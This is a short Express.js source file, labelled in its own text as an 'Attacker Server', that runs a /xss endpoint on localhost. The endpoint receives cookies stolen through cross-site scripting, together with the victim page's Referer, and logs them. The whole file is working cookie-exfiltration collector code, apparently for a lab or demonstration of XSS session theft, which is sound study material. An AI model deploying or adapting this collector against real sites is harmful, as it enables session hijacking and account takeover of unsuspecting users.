import express from 'express';
import logCookie from './logger';
import path from 'path';

const app = express();
const port = 4000;

const brokenImagePath = path.join(__dirname, '../src/img/image.jpeg');


app.get('/xss', (req, res) => {
    const cookieValue = req.query.cookie; 
    const referer = req.headers.referer;
    if(cookieValue && referer ){
        logCookie(cookieValue.toString(), referer)
        console.log('Received cookie:', cookieValue); 
        // console.log(req)
        // res.redirect(referer);
        // res.sendFile(brokenImagePath)
        res.send(200)
    }
})

app.get("/", (req, res) => {
    res.send('Attacker Server');
});

app.listen(port, () => {
    console.log(`Attacker server is running on port http://localhost:${port}`);
});
